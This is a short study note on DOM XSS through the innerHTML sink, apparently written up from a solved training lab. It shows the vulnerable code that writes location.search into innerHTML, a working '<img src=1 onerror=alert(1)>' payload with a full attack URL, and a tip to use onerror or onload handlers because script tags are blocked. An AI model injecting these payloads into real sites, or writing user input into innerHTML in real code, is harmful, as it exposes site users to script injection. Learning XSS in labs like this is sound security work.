# DOM XSS — innerHTML Sink

## The Sink

`innerHTML` sets the HTML content of an element. Unlike `innerText`, it **parses and renders HTML** — making it a dangerous sink when user input reaches it.

```javascript
element.innerHTML = userInput;
// if userInput contains HTML → it gets rendered
// if it contains <script> → browsers block it (modern browsers)
// but <img onerror=...> or <svg onload=...> still work ✅
```

> ⚠️ Modern browsers do **not** execute `<script>` tags injected via `innerHTML` — but event handlers like `onerror` and `onload` still execute.

---

## Lab: DOM XSS in innerHTML using location.search

**Level:** Apprentice ✅ Solved

**Vulnerable code:**
```javascript
document.getElementById('searchMessage').innerHTML = location.search;
```

**What happens normally:**
```
URL: ?search=hello
→ <div id="searchMessage">?search=hello</div>
```

**The attack:**
```
Payload: <img src=1 onerror=alert(1)>
```

**Full URL:**
```
https://site.com/?search=<img src=1 onerror=alert(1)>
```

**Result in DOM:**
```html
<div id="searchMessage">
  <img src=1 onerror=alert(1)>
</div>
```

The browser tries to load `src=1` (fails), then triggers `onerror` → executes `alert(1)`.

---

## innerHTML vs innerText

| | innerHTML | innerText |
|---|---|---|
| Parses HTML | ✅ Yes | ❌ No |
| Executes event handlers | ✅ Yes | ❌ No |
| Safe for user input | ❌ No | ✅ Yes |

---

## Key Takeaways

- `innerHTML` is one of the most common DOM XSS sinks
- `<script>` won't work here — use `<img onerror=>` or `<svg onload=>` instead
- `innerText` is the safe alternative — it treats everything as plain text
